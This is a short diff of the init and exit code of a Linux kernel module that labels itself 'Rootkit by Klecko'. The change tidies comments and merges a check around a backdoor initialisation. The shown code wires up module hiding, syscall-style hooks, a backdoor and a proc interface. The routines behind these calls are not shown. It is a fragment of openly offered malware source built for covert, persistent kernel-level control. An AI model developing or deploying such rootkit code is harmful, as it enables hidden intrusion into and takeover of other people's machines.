@@ -11,7 +11,6 @@ MODULE_AUTHOR("Klecko");
 MODULE_DESCRIPTION("Rootkit by Klecko");
 MODULE_VERSION("0.1");
 
-//insmod
 static int __init lkm_init(void){
 	log("ROOTKIT: Starting Rootkit ---------------------------------\n");
 	if (HIDE_MODULE){
@@ -26,11 +25,9 @@ static int __init lkm_init(void){
 		goto err_hooks;
 	}
 
-	if (BACKDOOR){
-		if (backdoor_init() == -1){
-			log(KERN_INFO "ROOTKIT: INIT ERROR backdoor\n");
-			goto err_backdoor;
-		}
+	if (BACKDOOR && backdoor_init() == -1){
+		log(KERN_INFO "ROOTKIT: INIT ERROR backdoor\n");
+		goto err_backdoor;
 	}
 
 	if (proc_init() == -1){
@@ -53,7 +50,6 @@ static int __init lkm_init(void){
 	return -1;
 }
 
-//rmmod
 static void __exit lkm_exit(void){
 	proc_exit();
 	if (BACKDOOR) backdoor_exit();
